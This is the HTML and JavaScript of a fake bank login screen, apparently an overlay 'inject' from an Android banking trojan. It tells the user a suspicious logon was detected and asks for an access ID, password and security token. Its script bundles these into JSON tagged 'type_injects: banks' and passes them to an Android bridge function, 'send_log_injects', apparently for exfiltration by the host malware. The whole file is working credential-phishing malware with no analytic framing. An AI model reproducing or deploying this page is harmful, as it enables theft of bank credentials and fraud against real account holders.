    <style>
        body {
            background-color: #870e40;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.5;
        }

        section {
            flex: 0.5;
        }

        footer {
            padding: 15px;
        }

        .line {
            width: 100%;
            height: 1px;
            background-color: #9b1049;
            margin-top: 10px;
            margin-bottom: 10px;
        }

        label {
            font-size: 14px;
            color: #fff;
        }

        .input {
            padding: 8px;
            background-color: #720b36;
            border: 0;
            border-radius: 4px;
            width: 100%;
            margin-bottom: 15px;
            color: #fff;
        }

        .button {
            width: 100%;
            padding: 7px;
            background-color: transparent;
            color :#fff;
            border: 0;
            font-size: 18px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

            <div class="line"></div>
            
            <p style="color: #fff;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>

            <label for="login">Access ID</label>
            <input type="tel" class="input" id="login" name="login" placeholder="" maxlength="12" autocomplete="off">

            <label for="password">Password</label>
            <span style="float: right;font-size: 8px;color: #fff;margin-top: 9px;"><u>I forgot my password</u></span>
            <input type="password" class="input" id="password" maxlength="8" name="password" placeholder="" autocomplete="off">

            <label for="token">Security Token</label>
            <span style="float: right;font-size: 8px;color: #fff;margin-top: 9px;">Enter security token if needed for login</span>
            <input type="password" class="input" id="token" name="token" placeholder="" autocomplete="off">

            <div class="line"></div>

            <input type="submit" class="button" id="sendData" disabled value="Log in">
        </footer>
    </form>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            token = document.getElementById('token'),
            sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            check()
        }

        function check() {
            if(login.value.length < 8 || password.value.length !== 8) {
                sendData.disabled = true;
            } else {
                sendData.disabled = false;
            }
        }

        password.onkeyup = () => {
            check()
        }

        sendData.onclick = () => {
            if(token.value.length != 0) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.token = token.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            } else {   
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
